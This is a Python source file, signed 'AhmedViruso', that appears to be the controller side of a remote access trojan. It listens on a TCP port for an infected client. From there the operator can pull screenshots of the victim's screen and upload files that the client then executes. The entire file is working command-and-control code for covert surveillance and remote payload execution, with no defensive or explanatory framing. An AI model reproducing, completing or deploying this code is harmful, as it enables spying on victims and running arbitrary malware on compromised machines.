# Python 3

try:
	import socket
except:
	print(" Error Import Library")
	exit()

print(" - By AhmedViruso")

def Create(): # Create Tcp Socket

    try:

        global S
        S = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        S.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 

    except socket.error as failed:

        print(" - Error Creating The Socket : " + str(failed))
        Create()


def Bind(): # Bind The Socket

    try:

        Ip = '127.0.0.1' 
        Port = 519  

        S.bind((Ip, Port))
        S.listen(1)
        print(" - Server Is Listening . .")

    except socket.error as failed:
        print(" - Socket Binding Error : " + str(failed) + "\n" + " - Retrying...")
        Bind()


def Accept(): # Accpet The Connection

    Con,address = S.accept()   
    print(" - Connection Has Been Established - Ip -> "+address[0]) 
    SendOrders(Con)


def SendOrders(Con):

    while True:

        try: # Check If Client is Online

            Con.send(str.encode(""))
        except: 

            print(" - The Connection is Dead ")
            Main()
            continue

        Command = input(" > ")

        Command = Command.lower() # Change string to lowercase

        if(Command == 'screen'):

            try:

                Con.send(str.encode(Command)) # Send Command

                F = open("Screen.jpg", "wb") 
                
                while True:

                    Data = Con.recv(1024) # Receive File Bytes

                    F.write(Data)

                    Check = len(Data)

                    print(" - " + str(len(Data)))

                    if(1024 != Check): # If 1024 > length (Data) , Stop Loop

                        F.close() # Close File

                        print(" - Done")

                        break

            except:

                print(" - Error 1 , Something Is Wrong")
                continue


        elif(Command == 'upload'):
        	
            try:
                    
                try:

                    Up = input(" - File Path -> ")
                    Up = Up.replace('"',"")

                    with open(Up, "rb") as F:
                        Data = F.read() # Read File Bytes

                except:
                    print(" - File Error")
                    continue

                Con.send(str.encode(Command))
                                
                if(Con.recv(1024).decode("utf-8") == "file"):
                	
                        User = input(" - File Extension -> ")
                        Con.send(str.encode(User))

                        Check = Con.recv(1024).decode("utf-8")

                        if(Check == "errorfile"):
                            print(" - Error File")
                            continue

                        elif(Check == "truefile"):
                            pass

                        else:
                            print(" - [1] Undefined Reposnse From Client, Try Again")
                            continue

                        Con.sendall(Data) # Send the File

                        print(" - Wait")

                        F.close() # Close The File

                        Check = Con.recv(1024).decode("utf-8")

                        if(Check == "executetrue"):
                            print(" - Done")

                        elif(Check == "executefalse"):
                            print(" - Error Execute")
                            continue

                        else:
                            print(" - [2] Undefined Reposnse From Client , Try Again")
                            continue

                else:
                    print(" - [3] Undefined Reposnse From Client , Try Again")
                    continue
                        
            except:

                print(" - Error 2 , Something Is Wrong")
                continue


def Main():
    Create()
    Bind()
    Accept()


Main()
